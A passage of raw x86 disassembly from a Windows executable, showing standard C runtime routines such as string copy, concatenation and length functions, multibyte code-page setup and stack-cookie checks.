  425709:	neg    eax
  42570b:	sbb    eax,eax
  42570d:	neg    eax
  42570f:	pop    ecx
  425710:	dec    eax
  425711:	ret    
  425712:	push   ebp
  425713:	mov    ebp,esp
  425715:	sub    esp,0x10
  425718:	push   ebx
  425719:	xor    ebx,ebx
  42571b:	cmp    DWORD PTR ds:0x463870,ebx
  425721:	push   esi
  425722:	push   edi
  425723:	jne    0x425792
  425725:	push   0x429688
  42572a:	call   DWORD PTR ds:0x4290f8
  425730:	mov    edi,eax
  425732:	cmp    edi,ebx
  425734:	je     0x4257cd
  42573a:	mov    esi,DWORD PTR ds:0x429028
  425740:	push   0x42967c
  425745:	push   edi
  425746:	call   esi
  425748:	test   eax,eax
  42574a:	mov    ds:0x463870,eax
  42574f:	je     0x4257cd
  425751:	push   0x42966c
  425756:	push   edi
  425757:	call   esi
  425759:	push   0x429658
  42575e:	push   edi
  42575f:	mov    ds:0x463874,eax
  425764:	call   esi
  425766:	cmp    DWORD PTR ds:0x4635c4,0x2
  42576d:	mov    ds:0x463878,eax
  425772:	jne    0x425792
  425774:	push   0x42963c
  425779:	push   edi
  42577a:	call   esi
  42577c:	test   eax,eax
  42577e:	mov    ds:0x463880,eax
  425783:	je     0x425792
  425785:	push   0x429624
  42578a:	push   edi
  42578b:	call   esi
  42578d:	mov    ds:0x46387c,eax
  425792:	mov    eax,ds:0x46387c
  425797:	test   eax,eax
  425799:	je     0x4257d7
  42579b:	call   eax
  42579d:	test   eax,eax
  42579f:	je     0x4257be
  4257a1:	lea    ecx,[ebp-0x4]
  4257a4:	push   ecx
  4257a5:	push   0xc
  4257a7:	lea    ecx,[ebp-0x10]
  4257aa:	push   ecx
  4257ab:	push   0x1
  4257ad:	push   eax
  4257ae:	call   DWORD PTR ds:0x463880
  4257b4:	test   eax,eax
  4257b6:	je     0x4257be
  4257b8:	test   BYTE PTR [ebp-0x8],0x1
  4257bc:	jne    0x4257d7
  4257be:	cmp    DWORD PTR ds:0x4635d0,0x4
  4257c5:	jb     0x4257d1
  4257c7:	or     BYTE PTR [ebp+0x12],0x20
  4257cb:	jmp    0x4257f6
  4257cd:	xor    eax,eax
  4257cf:	jmp    0x425806
  4257d1:	or     BYTE PTR [ebp+0x12],0x4
  4257d5:	jmp    0x4257f6
  4257d7:	mov    eax,ds:0x463874
  4257dc:	test   eax,eax
  4257de:	je     0x4257f6
  4257e0:	call   eax
  4257e2:	mov    ebx,eax
  4257e4:	test   ebx,ebx
  4257e6:	je     0x4257f6
  4257e8:	mov    eax,ds:0x463878
  4257ed:	test   eax,eax
  4257ef:	je     0x4257f6
  4257f1:	push   ebx
  4257f2:	call   eax
  4257f4:	mov    ebx,eax
  4257f6:	push   DWORD PTR [ebp+0x10]
  4257f9:	push   DWORD PTR [ebp+0xc]
  4257fc:	push   DWORD PTR [ebp+0x8]
  4257ff:	push   ebx
  425800:	call   DWORD PTR ds:0x463870
  425806:	pop    edi
  425807:	pop    esi
  425808:	pop    ebx
  425809:	leave  
  42580a:	ret    
  42580b:	int3   
  42580c:	int3   
  42580d:	int3   
  42580e:	int3   
  42580f:	int3   
  425810:	push   edi
  425811:	mov    edi,DWORD PTR [esp+0x8]
  425815:	jmp    0x425885
  425817:	lea    esp,[esp+0x0]
  42581e:	mov    edi,edi
  425820:	mov    ecx,DWORD PTR [esp+0x4]
  425824:	push   edi
  425825:	test   ecx,0x3
  42582b:	je     0x425840
  42582d:	mov    al,BYTE PTR [ecx]
  42582f:	add    ecx,0x1
  425832:	test   al,al
  425834:	je     0x425873
  425836:	test   ecx,0x3
  42583c:	jne    0x42582d
  42583e:	mov    edi,edi
  425840:	mov    eax,DWORD PTR [ecx]
  425842:	mov    edx,0x7efefeff
  425847:	add    edx,eax
  425849:	xor    eax,0xffffffff
  42584c:	xor    eax,edx
  42584e:	add    ecx,0x4
  425851:	test   eax,0x81010100
  425856:	je     0x425840
  425858:	mov    eax,DWORD PTR [ecx-0x4]
  42585b:	test   al,al
  42585d:	je     0x425882
  42585f:	test   ah,ah
  425861:	je     0x42587d
  425863:	test   eax,0xff0000
  425868:	je     0x425878
  42586a:	test   eax,0xff000000
  42586f:	je     0x425873
  425871:	jmp    0x425840
  425873:	lea    edi,[ecx-0x1]
  425876:	jmp    0x425885
  425878:	lea    edi,[ecx-0x2]
  42587b:	jmp    0x425885
  42587d:	lea    edi,[ecx-0x3]
  425880:	jmp    0x425885
  425882:	lea    edi,[ecx-0x4]
  425885:	mov    ecx,DWORD PTR [esp+0xc]
  425889:	test   ecx,0x3
  42588f:	je     0x4258ae
  425891:	mov    dl,BYTE PTR [ecx]
  425893:	add    ecx,0x1
  425896:	test   dl,dl
  425898:	je     0x425900
  42589a:	mov    BYTE PTR [edi],dl
  42589c:	add    edi,0x1
  42589f:	test   ecx,0x3
  4258a5:	jne    0x425891
  4258a7:	jmp    0x4258ae
  4258a9:	mov    DWORD PTR [edi],edx
  4258ab:	add    edi,0x4
  4258ae:	mov    edx,0x7efefeff
  4258b3:	mov    eax,DWORD PTR [ecx]
  4258b5:	add    edx,eax
  4258b7:	xor    eax,0xffffffff
  4258ba:	xor    eax,edx
  4258bc:	mov    edx,DWORD PTR [ecx]
  4258be:	add    ecx,0x4
  4258c1:	test   eax,0x81010100
  4258c6:	je     0x4258a9
  4258c8:	test   dl,dl
  4258ca:	je     0x425900
  4258cc:	test   dh,dh
  4258ce:	je     0x4258f7
  4258d0:	test   edx,0xff0000
  4258d6:	je     0x4258ea
  4258d8:	test   edx,0xff000000
  4258de:	je     0x4258e2
  4258e0:	jmp    0x4258a9
  4258e2:	mov    DWORD PTR [edi],edx
  4258e4:	mov    eax,DWORD PTR [esp+0x8]
  4258e8:	pop    edi
  4258e9:	ret    
  4258ea:	mov    WORD PTR [edi],dx
  4258ed:	mov    eax,DWORD PTR [esp+0x8]
  4258f1:	mov    BYTE PTR [edi+0x2],0x0
  4258f5:	pop    edi
  4258f6:	ret    
  4258f7:	mov    WORD PTR [edi],dx
  4258fa:	mov    eax,DWORD PTR [esp+0x8]
  4258fe:	pop    edi
  4258ff:	ret    
  425900:	mov    BYTE PTR [edi],dl
  425902:	mov    eax,DWORD PTR [esp+0x8]
  425906:	pop    edi
  425907:	ret    
  425908:	int3   
  425909:	int3   
  42590a:	int3   
  42590b:	int3   
  42590c:	int3   
  42590d:	int3   
  42590e:	int3   
  42590f:	int3   
  425910:	mov    ecx,DWORD PTR [esp+0xc]
  425914:	push   edi
  425915:	test   ecx,ecx
  425917:	je     0x4259af
  42591d:	push   esi
  42591e:	push   ebx
  42591f:	mov    ebx,ecx
  425921:	mov    esi,DWORD PTR [esp+0x14]
  425925:	test   esi,0x3
  42592b:	mov    edi,DWORD PTR [esp+0x10]
  42592f:	jne    0x42593c
  425931:	shr    ecx,0x2
  425934:	jne    0x4259bf
  42593a:	jmp    0x425963
  42593c:	mov    al,BYTE PTR [esi]
  42593e:	add    esi,0x1
  425941:	mov    BYTE PTR [edi],al
  425943:	add    edi,0x1
  425946:	sub    ecx,0x1
  425949:	je     0x425976
  42594b:	test   al,al
  42594d:	je     0x42597e
  42594f:	test   esi,0x3
  425955:	jne    0x42593c
  425957:	mov    ebx,ecx
  425959:	shr    ecx,0x2
  42595c:	jne    0x4259bf
  42595e:	and    ebx,0x3
  425961:	je     0x425976
  425963:	mov    al,BYTE PTR [esi]
  425965:	add    esi,0x1
  425968:	mov    BYTE PTR [edi],al
  42596a:	add    edi,0x1
  42596d:	test   al,al
  42596f:	je     0x4259a8
  425971:	sub    ebx,0x1
  425974:	jne    0x425963
  425976:	mov    eax,DWORD PTR [esp+0x10]
  42597a:	pop    ebx
  42597b:	pop    esi
  42597c:	pop    edi
  42597d:	ret    
  42597e:	test   edi,0x3
  425984:	je     0x42599c
  425986:	mov    BYTE PTR [edi],al
  425988:	add    edi,0x1
  42598b:	sub    ecx,0x1
  42598e:	je     0x425a2c
  425994:	test   edi,0x3
  42599a:	jne    0x425986
  42599c:	mov    ebx,ecx
  42599e:	shr    ecx,0x2
  4259a1:	jne    0x425a17
  4259a3:	mov    BYTE PTR [edi],al
  4259a5:	add    edi,0x1
  4259a8:	sub    ebx,0x1
  4259ab:	jne    0x4259a3
  4259ad:	pop    ebx
  4259ae:	pop    esi
  4259af:	mov    eax,DWORD PTR [esp+0x8]
  4259b3:	pop    edi
  4259b4:	ret    
  4259b5:	mov    DWORD PTR [edi],edx
  4259b7:	add    edi,0x4
  4259ba:	sub    ecx,0x1
  4259bd:	je     0x42595e
  4259bf:	mov    edx,0x7efefeff
  4259c4:	mov    eax,DWORD PTR [esi]
  4259c6:	add    edx,eax
  4259c8:	xor    eax,0xffffffff
  4259cb:	xor    eax,edx
  4259cd:	mov    edx,DWORD PTR [esi]
  4259cf:	add    esi,0x4
  4259d2:	test   eax,0x81010100
  4259d7:	je     0x4259b5
  4259d9:	test   dl,dl
  4259db:	je     0x425a09
  4259dd:	test   dh,dh
  4259df:	je     0x4259ff
  4259e1:	test   edx,0xff0000
  4259e7:	je     0x4259f5
  4259e9:	test   edx,0xff000000
  4259ef:	jne    0x4259b5
  4259f1:	mov    DWORD PTR [edi],edx
  4259f3:	jmp    0x425a0d
  4259f5:	and    edx,0xffff
  4259fb:	mov    DWORD PTR [edi],edx
  4259fd:	jmp    0x425a0d
  4259ff:	and    edx,0xff
  425a05:	mov    DWORD PTR [edi],edx
  425a07:	jmp    0x425a0d
  425a09:	xor    edx,edx
  425a0b:	mov    DWORD PTR [edi],edx
  425a0d:	add    edi,0x4
  425a10:	xor    eax,eax
  425a12:	sub    ecx,0x1
  425a15:	je     0x425a23
  425a17:	xor    eax,eax
  425a19:	mov    DWORD PTR [edi],eax
  425a1b:	add    edi,0x4
  425a1e:	sub    ecx,0x1
  425a21:	jne    0x425a19
  425a23:	and    ebx,0x3
  425a26:	jne    0x4259a3
  425a2c:	mov    eax,DWORD PTR [esp+0x10]
  425a30:	pop    ebx
  425a31:	pop    esi
  425a32:	pop    edi
  425a33:	ret    
  425a34:	int3   
  425a35:	int3   
  425a36:	int3   
  425a37:	int3   
  425a38:	int3   
  425a39:	int3   
  425a3a:	int3   
  425a3b:	int3   
  425a3c:	int3   
  425a3d:	int3   
  425a3e:	int3   
  425a3f:	int3   
  425a40:	mov    ecx,DWORD PTR [esp+0x4]
  425a44:	test   ecx,0x3
  425a4a:	je     0x425a70
  425a4c:	mov    al,BYTE PTR [ecx]
  425a4e:	add    ecx,0x1
  425a51:	test   al,al
  425a53:	je     0x425aa3
  425a55:	test   ecx,0x3
  425a5b:	jne    0x425a4c
  425a5d:	add    eax,0x0
  425a62:	lea    esp,[esp+0x0]
  425a69:	lea    esp,[esp+0x0]
  425a70:	mov    eax,DWORD PTR [ecx]
  425a72:	mov    edx,0x7efefeff
  425a77:	add    edx,eax
  425a79:	xor    eax,0xffffffff
  425a7c:	xor    eax,edx
  425a7e:	add    ecx,0x4
  425a81:	test   eax,0x81010100
  425a86:	je     0x425a70
  425a88:	mov    eax,DWORD PTR [ecx-0x4]
  425a8b:	test   al,al
  425a8d:	je     0x425ac1
  425a8f:	test   ah,ah
  425a91:	je     0x425ab7
  425a93:	test   eax,0xff0000
  425a98:	je     0x425aad
  425a9a:	test   eax,0xff000000
  425a9f:	je     0x425aa3
  425aa1:	jmp    0x425a70
  425aa3:	lea    eax,[ecx-0x1]
  425aa6:	mov    ecx,DWORD PTR [esp+0x4]
  425aaa:	sub    eax,ecx
  425aac:	ret    
  425aad:	lea    eax,[ecx-0x2]
  425ab0:	mov    ecx,DWORD PTR [esp+0x4]
  425ab4:	sub    eax,ecx
  425ab6:	ret    
  425ab7:	lea    eax,[ecx-0x3]
  425aba:	mov    ecx,DWORD PTR [esp+0x4]
  425abe:	sub    eax,ecx
  425ac0:	ret    
  425ac1:	lea    eax,[ecx-0x4]
  425ac4:	mov    ecx,DWORD PTR [esp+0x4]
  425ac8:	sub    eax,ecx
  425aca:	ret    
  425acb:	push   0x8
  425acd:	push   0x429698
  425ad2:	call   0x425434
  425ad7:	and    DWORD PTR [ebp-0x4],0x0
  425adb:	push   0x0
  425add:	push   0x1
  425adf:	call   0x427652
  425ae4:	pop    ecx
  425ae5:	pop    ecx
  425ae6:	jmp    0x425aef
  425ae8:	xor    eax,eax
  425aea:	inc    eax
  425aeb:	ret    
  425aec:	mov    esp,DWORD PTR [ebp-0x18]
  425aef:	or     DWORD PTR [ebp-0x4],0xffffffff
  425af3:	push   0x3
  425af5:	call   DWORD PTR ds:0x42909c
  425afb:	int3   
  425afc:	cmp    ecx,DWORD PTR ds:0x462f30
  425b02:	jne    0x425b05
  425b04:	ret    
  425b05:	jmp    0x425acb
  425b0a:	movzx  eax,BYTE PTR [esp+0x4]
  425b0f:	mov    cl,BYTE PTR [esp+0xc]
  425b13:	test   BYTE PTR [eax+0x463a21],cl
  425b19:	jne    0x425b37
  425b1b:	cmp    DWORD PTR [esp+0x8],0x0
  425b20:	je     0x425b30
  425b22:	movzx  eax,WORD PTR [eax*2+0x429a92]
  425b2a:	and    eax,DWORD PTR [esp+0x8]
  425b2e:	jmp    0x425b32
  425b30:	xor    eax,eax
  425b32:	test   eax,eax
  425b34:	jne    0x425b37
  425b36:	ret    
  425b37:	xor    eax,eax
  425b39:	inc    eax
  425b3a:	ret    
  425b3b:	push   0x4
  425b3d:	push   0x0
  425b3f:	push   DWORD PTR [esp+0xc]
  425b43:	call   0x425b0a
  425b48:	add    esp,0xc
  425b4b:	ret    
  425b4c:	sub    eax,0x3a4
  425b51:	je     0x425b75
  425b53:	sub    eax,0x4
  425b56:	je     0x425b6f
  425b58:	sub    eax,0xd
  425b5b:	je     0x425b69
  425b5d:	dec    eax
  425b5e:	je     0x425b63
  425b60:	xor    eax,eax
  425b62:	ret    
  425b63:	mov    eax,0x404
  425b68:	ret    
  425b69:	mov    eax,0x412
  425b6e:	ret    
  425b6f:	mov    eax,0x804
  425b74:	ret    
  425b75:	mov    eax,0x411
  425b7a:	ret    
  425b7b:	push   edi
  425b7c:	push   0x40
  425b7e:	xor    eax,eax
  425b80:	pop    ecx
  425b81:	mov    edi,0x463a20
  425b86:	rep stos DWORD PTR es:[edi],eax
  425b88:	stos   BYTE PTR es:[edi],al
  425b89:	xor    eax,eax
  425b8b:	mov    ds:0x463b24,eax
  425b90:	mov    ds:0x463a1c,eax
  425b95:	mov    ds:0x463a14,eax
  425b9a:	mov    edi,0x463b30
  425b9f:	stos   DWORD PTR es:[edi],eax
  425ba0:	stos   DWORD PTR es:[edi],eax
  425ba1:	stos   DWORD PTR es:[edi],eax
  425ba2:	pop    edi
  425ba3:	ret    
  425ba4:	push   ebp
  425ba5:	mov    ebp,esp
  425ba7:	sub    esp,0x518
  425bad:	mov    eax,ds:0x462f30
  425bb2:	xor    eax,DWORD PTR [ebp+0x4]
  425bb5:	push   esi
  425bb6:	mov    DWORD PTR [ebp-0x4],eax
  425bb9:	lea    eax,[ebp-0x18]
  425bbc:	push   eax
  425bbd:	push   DWORD PTR ds:0x463b24
  425bc3:	call   DWORD PTR ds:0x429104
  425bc9:	cmp    eax,0x1
  425bcc:	mov    esi,0x100
  425bd1:	jne    0x425ce4
  425bd7:	xor    eax,eax
  425bd9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425be0:	inc    eax
  425be1:	cmp    eax,esi
  425be3:	jb     0x425bd9
  425be5:	mov    al,BYTE PTR [ebp-0x12]
  425be8:	test   al,al
  425bea:	mov    BYTE PTR [ebp-0x118],0x20
  425bf1:	je     0x425c29
  425bf3:	push   ebx
  425bf4:	lea    edx,[ebp-0x11]
  425bf7:	push   edi
  425bf8:	movzx  ecx,BYTE PTR [edx]
  425bfb:	movzx  eax,al
  425bfe:	cmp    eax,ecx
  425c00:	ja     0x425c1f
  425c02:	sub    ecx,eax
  425c04:	inc    ecx
  425c05:	mov    ebx,ecx
  425c07:	shr    ecx,0x2
  425c0a:	lea    edi,[ebp+eax*1-0x118]
  425c11:	mov    eax,0x20202020
  425c16:	rep stos DWORD PTR es:[edi],eax
  425c18:	mov    ecx,ebx
  425c1a:	and    ecx,0x3
  425c1d:	rep stos BYTE PTR es:[edi],al
  425c1f:	inc    edx
  425c20:	mov    al,BYTE PTR [edx]
  425c22:	inc    edx
  425c23:	test   al,al
  425c25:	jne    0x425bf8
  425c27:	pop    edi
  425c28:	pop    ebx
  425c29:	push   0x0
  425c2b:	push   DWORD PTR ds:0x463a14
  425c31:	lea    eax,[ebp-0x518]
  425c37:	push   DWORD PTR ds:0x463b24
  425c3d:	push   eax
  425c3e:	push   esi
  425c3f:	lea    eax,[ebp-0x118]
  425c45:	push   eax
  425c46:	push   0x1
  425c48:	call   0x427b58
  425c4d:	push   0x0
  425c4f:	push   DWORD PTR ds:0x463b24
  425c55:	lea    eax,[ebp-0x218]
  425c5b:	push   esi
  425c5c:	push   eax
  425c5d:	push   esi
  425c5e:	lea    eax,[ebp-0x118]
  425c64:	push   eax
  425c65:	push   esi
  425c66:	push   DWORD PTR ds:0x463a14
  425c6c:	call   0x42779c
  425c71:	push   0x0
  425c73:	push   DWORD PTR ds:0x463b24
  425c79:	lea    eax,[ebp-0x318]
  425c7f:	push   esi
  425c80:	push   eax
  425c81:	push   esi
  425c82:	lea    eax,[ebp-0x118]
  425c88:	push   eax
  425c89:	push   0x200
  425c8e:	push   DWORD PTR ds:0x463a14
  425c94:	call   0x42779c
  425c99:	add    esp,0x5c
  425c9c:	xor    eax,eax
  425c9e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425ca6:	test   cl,0x1
  425ca9:	je     0x425cc1
  425cab:	or     BYTE PTR [eax+0x463a21],0x10
  425cb2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425cb9:	mov    BYTE PTR [eax+0x463b40],cl
  425cbf:	jmp    0x425cdd
  425cc1:	test   cl,0x2
  425cc4:	je     0x425cd6
  425cc6:	or     BYTE PTR [eax+0x463a21],0x20
  425ccd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425cd4:	jmp    0x425cb9
  425cd6:	and    BYTE PTR [eax+0x463b40],0x0
  425cdd:	inc    eax
  425cde:	cmp    eax,esi
  425ce0:	jb     0x425c9e
  425ce2:	jmp    0x425d28
  425ce4:	xor    eax,eax
  425ce6:	cmp    eax,0x41
  425ce9:	jb     0x425d04
  425ceb:	cmp    eax,0x5a
  425cee:	ja     0x425d04
  425cf0:	or     BYTE PTR [eax+0x463a21],0x10
  425cf7:	mov    cl,al
  425cf9:	add    cl,0x20
  425cfc:	mov    BYTE PTR [eax+0x463b40],cl
  425d02:	jmp    0x425d23
  425d04:	cmp    eax,0x61
  425d07:	jb     0x425d1c
  425d09:	cmp    eax,0x7a
  425d0c:	ja     0x425d1c
  425d0e:	or     BYTE PTR [eax+0x463a21],0x20
  425d15:	mov    cl,al
  425d17:	sub    cl,0x20
  425d1a:	jmp    0x425cfc
  425d1c:	and    BYTE PTR [eax+0x463b40],0x0
  425d23:	inc    eax
  425d24:	cmp    eax,esi
  425d26:	jb     0x425ce6
  425d28:	mov    ecx,DWORD PTR [ebp-0x4]
  425d2b:	xor    ecx,DWORD PTR [ebp+0x4]
  425d2e:	pop    esi
  425d2f:	call   0x425afc
  425d34:	leave  
  425d35:	ret    
  425d36:	push   ebp
  425d37:	mov    ebp,esp
  425d39:	sub    esp,0x1c
  425d3c:	mov    eax,ds:0x462f30
  425d41:	xor    eax,DWORD PTR [ebp+0x4]
  425d44:	push   ebx
  425d45:	push   esi
  425d46:	mov    esi,DWORD PTR [ebp+0x8]
  425d49:	xor    ebx,ebx
  425d4b:	cmp    esi,ebx
  425d4d:	mov    DWORD PTR [ebp-0x4],eax
  425d50:	push   edi
  425d51:	je     0x425eab
  425d57:	xor    edx,edx
  425d59:	xor    eax,eax
  425d5b:	cmp    DWORD PTR [eax+0x462f40],esi
  425d61:	je     0x425dc8
  425d63:	add    eax,0x30
  425d66:	inc    edx
  425d67:	cmp    eax,0xf0
  425d6c:	jb     0x425d5b
  425d6e:	lea    eax,[ebp-0x1c]
  425d71:	push   eax
  425d72:	push   esi
  425d73:	call   DWORD PTR ds:0x429104
  425d79:	cmp    eax,0x1
  425d7c:	jne    0x425ea3
  425d82:	push   0x40
  425d84:	xor    eax,eax
  425d86:	cmp    DWORD PTR [ebp-0x1c],0x1
  425d8a:	pop    ecx
  425d8b:	mov    edi,0x463a20
  425d90:	rep stos DWORD PTR es:[edi],eax
  425d92:	stos   BYTE PTR es:[edi],al
  425d93:	mov    DWORD PTR ds:0x463b24,esi
  425d99:	mov    DWORD PTR ds:0x463a14,ebx
  425d9f:	jbe    0x425e91
  425da5:	cmp    BYTE PTR [ebp-0x16],0x0
  425da9:	je     0x425e69
  425daf:	lea    ecx,[ebp-0x15]
  425db2:	mov    dl,BYTE PTR [ecx]
  425db4:	test   dl,dl
  425db6:	je     0x425e69
  425dbc:	movzx  eax,BYTE PTR [ecx-0x1]
  425dc0:	movzx  edx,dl
  425dc3:	jmp    0x425e59
  425dc8:	push   0x40
  425dca:	xor    eax,eax
  425dcc:	pop    ecx
  425dcd:	mov    edi,0x463a20
  425dd2:	rep stos DWORD PTR es:[edi],eax
  425dd4:	lea    ecx,[edx+edx*2]
  425dd7:	shl    ecx,0x4
  425dda:	mov    DWORD PTR [ebp-0x8],ebx
  425ddd:	stos   BYTE PTR es:[edi],al
  425dde:	lea    ebx,[ecx+0x462f50]
  425de4:	mov    al,BYTE PTR [ebx]
  425de6:	mov    esi,ebx
  425de8:	jmp    0x425e13
  425dea:	mov    dl,BYTE PTR [esi+0x1]
  425ded:	test   dl,dl
  425def:	je     0x425e17
  425df1:	movzx  eax,al
  425df4:	movzx  edi,dl
  425df7:	cmp    eax,edi
  425df9:	ja     0x425e0f
  425dfb:	mov    edx,DWORD PTR [ebp-0x8]
  425dfe:	mov    dl,BYTE PTR [edx+0x462f38]
  425e04:	or     BYTE PTR [eax+0x463a21],dl
  425e0a:	inc    eax
  425e0b:	cmp    eax,edi
  425e0d:	jbe    0x425e04
  425e0f:	inc    esi
  425e10:	inc    esi
  425e11:	mov    al,BYTE PTR [esi]
  425e13:	test   al,al
  425e15:	jne    0x425dea
  425e17:	inc    DWORD PTR [ebp-0x8]
  425e1a:	add    ebx,0x8
  425e1d:	cmp    DWORD PTR [ebp-0x8],0x4
  425e21:	jb     0x425de4
  425e23:	mov    eax,DWORD PTR [ebp+0x8]
  425e26:	mov    ds:0x463b24,eax
  425e2b:	mov    DWORD PTR ds:0x463a1c,0x1
  425e35:	call   0x425b4c
  425e3a:	lea    ecx,[ecx+0x462f44]
  425e40:	mov    esi,ecx
  425e42:	mov    edi,0x463b30
  425e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e49:	mov    ds:0x463a14,eax
  425e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e4f:	jmp    0x425eb0
  425e51:	or     BYTE PTR [eax+0x463a21],0x4
  425e58:	inc    eax
  425e59:	cmp    eax,edx
  425e5b:	jbe    0x425e51
  425e5d:	inc    ecx
  425e5e:	inc    ecx
  425e5f:	cmp    BYTE PTR [ecx-0x1],0x0
  425e63:	jne    0x425db2
  425e69:	xor    ecx,ecx
  425e6b:	inc    ecx
  425e6c:	mov    eax,ecx
  425e6e:	or     BYTE PTR [eax+0x463a21],0x8
  425e75:	inc    eax
  425e76:	cmp    eax,0xff
  425e7b:	jb     0x425e6e
  425e7d:	mov    eax,esi
  425e7f:	call   0x425b4c
  425e84:	mov    ds:0x463a14,eax
  425e89:	mov    DWORD PTR ds:0x463a1c,ecx
  425e8f:	jmp    0x425e97
  425e91:	mov    DWORD PTR ds:0x463a1c,ebx
  425e97:	xor    eax,eax
  425e99:	mov    edi,0x463b30
  425e9e:	stos   DWORD PTR es:[edi],eax
  425e9f:	stos   DWORD PTR es:[edi],eax
  425ea0:	stos   DWORD PTR es:[edi],eax
  425ea1:	jmp    0x425eb0
  425ea3:	cmp    DWORD PTR ds:0x463884,ebx
  425ea9:	je     0x425eb9
  425eab:	call   0x425b7b
  425eb0:	call   0x425ba4
  425eb5:	xor    eax,eax
  425eb7:	jmp    0x425ebc
  425eb9:	or     eax,0xffffffff
  425ebc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ebf:	xor    ecx,DWORD PTR [ebp+0x4]
  425ec2:	pop    edi
  425ec3:	pop    esi
  425ec4:	pop    ebx
  425ec5:	call   0x425afc
  425eca:	leave  
  425ecb:	ret    
  425ecc:	push   0x14
  425ece:	push   0x4296a8
  425ed3:	call   0x425434
  425ed8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425edc:	push   0xd
  425ede:	call   0x4255ef
  425ee3:	pop    ecx
  425ee4:	xor    edi,edi
  425ee6:	mov    DWORD PTR [ebp-0x4],edi
  425ee9:	mov    DWORD PTR ds:0x463884,edi
  425eef:	mov    eax,DWORD PTR [ebp+0x8]
  425ef2:	cmp    eax,0xfffffffe
  425ef5:	jne    0x425f09
  425ef7:	mov    DWORD PTR ds:0x463884,0x1
  425f01:	call   DWORD PTR ds:0x429100
  425f07:	jmp    0x425f34
  425f09:	cmp    eax,0xfffffffd
  425f0c:	jne    0x425f20
  425f0e:	mov    DWORD PTR ds:0x463884,0x1
  425f18:	call   DWORD PTR ds:0x4290fc
  425f1e:	jmp    0x425f34
  425f20:	cmp    eax,0xfffffffc
  425f23:	jne    0x425f34
  425f25:	mov    DWORD PTR ds:0x463884,0x1
  425f2f:	mov    eax,ds:0x4638b4
  425f34:	mov    DWORD PTR [ebp+0x8],eax
  425f37:	cmp    eax,DWORD PTR ds:0x463b24
  425f3d:	je     0x425ffe
  425f43:	mov    esi,DWORD PTR ds:0x463a18
  425f49:	mov    DWORD PTR [ebp-0x20],esi
  425f4c:	cmp    esi,edi
  425f4e:	je     0x425f54
  425f50:	cmp    DWORD PTR [esi],edi
  425f52:	je     0x425f64
  425f54:	push   0x220
  425f59:	call   0x426152
  425f5e:	pop    ecx
  425f5f:	mov    esi,eax
  425f61:	mov    DWORD PTR [ebp-0x20],esi
  425f64:	cmp    esi,edi
  425f66:	je     0x425fe7
  425f68:	push   DWORD PTR [ebp+0x8]
  425f6b:	call   0x425d36
  425f70:	pop    ecx
  425f71:	mov    DWORD PTR [ebp-0x1c],eax
  425f74:	cmp    eax,edi
  425f76:	jne    0x425fe7
  425f78:	mov    DWORD PTR [esi],edi
  425f7a:	mov    eax,ds:0x463b24
  425f7f:	mov    DWORD PTR [esi+0x4],eax
  425f82:	mov    eax,ds:0x463a1c
  425f87:	mov    DWORD PTR [esi+0x8],eax
  425f8a:	mov    eax,ds:0x463a14
  425f8f:	mov    DWORD PTR [esi+0xc],eax
  425f92:	xor    eax,eax
  425f94:	mov    DWORD PTR [ebp-0x24],eax
  425f97:	cmp    eax,0x5
  425f9a:	jge    0x425fac
  425f9c:	mov    cx,WORD PTR [eax*2+0x463b30]
  425fa4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425fa9:	inc    eax
  425faa:	jmp    0x425f94
  425fac:	xor    eax,eax
  425fae:	mov    DWORD PTR [ebp-0x24],eax
  425fb1:	cmp    eax,0x101
  425fb6:	jge    0x425fc5
  425fb8:	mov    cl,BYTE PTR [eax+0x463a20]
  425fbe:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425fc2:	inc    eax
  425fc3:	jmp    0x425fae
  425fc5:	xor    eax,eax
  425fc7:	mov    DWORD PTR [ebp-0x24],eax
  425fca:	cmp    eax,0x100
  425fcf:	jge    0x425fe1
  425fd1:	mov    cl,BYTE PTR [eax+0x463b40]
  425fd7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425fde:	inc    eax
  425fdf:	jmp    0x425fc7
  425fe1:	mov    DWORD PTR ds:0x463a18,esi
  425fe7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425feb:	jne    0x426001
  425fed:	cmp    esi,DWORD PTR ds:0x463a18
  425ff3:	je     0x426001
  425ff5:	push   esi
  425ff6:	call   0x42603a
  425ffb:	pop    ecx
  425ffc:	jmp    0x426001
  425ffe:	mov    DWORD PTR [ebp-0x1c],edi
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x426013
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	call   0x42546f
  426012:	ret    
  426013:	push   0xd
  426015:	call   0x42555b
  42601a:	pop    ecx
  42601b:	ret    
  42601c:	cmp    DWORD PTR ds:0x463d6c,0x0
  426023:	jne    0x426037
  426025:	push   0xfffffffd
  426027:	call   0x425ecc
  42602c:	pop    ecx
  42602d:	mov    DWORD PTR ds:0x463d6c,0x1
  426037:	xor    eax,eax
  426039:	ret    
  42603a:	push   0xc
  42603c:	push   0x4296b8
  426041:	call   0x425434
  426046:	mov    esi,DWORD PTR [ebp+0x8]
  426049:	test   esi,esi
  42604b:	je     0x4260a5
  42604d:	cmp    DWORD PTR ds:0x463c44,0x3
  426054:	jne    0x426096
  426056:	push   0x4
  426058:	call   0x4255ef
  42605d:	pop    ecx
  42605e:	and    DWORD PTR [ebp-0x4],0x0
  426062:	push   esi
  426063:	call   0x426812
  426068:	pop    ecx
  426069:	mov    DWORD PTR [ebp-0x1c],eax
  42606c:	test   eax,eax
  42606e:	je     0x426079
  426070:	push   esi
  426071:	push   eax
  426072:	call   0x42683d
  426077:	pop    ecx
  426078:	pop    ecx
  426079:	or     DWORD PTR [ebp-0x4],0xffffffff
  42607d:	call   0x42608d
  426082:	cmp    DWORD PTR [ebp-0x1c],0x0
  426086:	jne    0x4260a5
  426088:	push   DWORD PTR [ebp+0x8]
  42608b:	jmp    0x426097
  42608d:	push   0x4
  42608f:	call   0x42555b
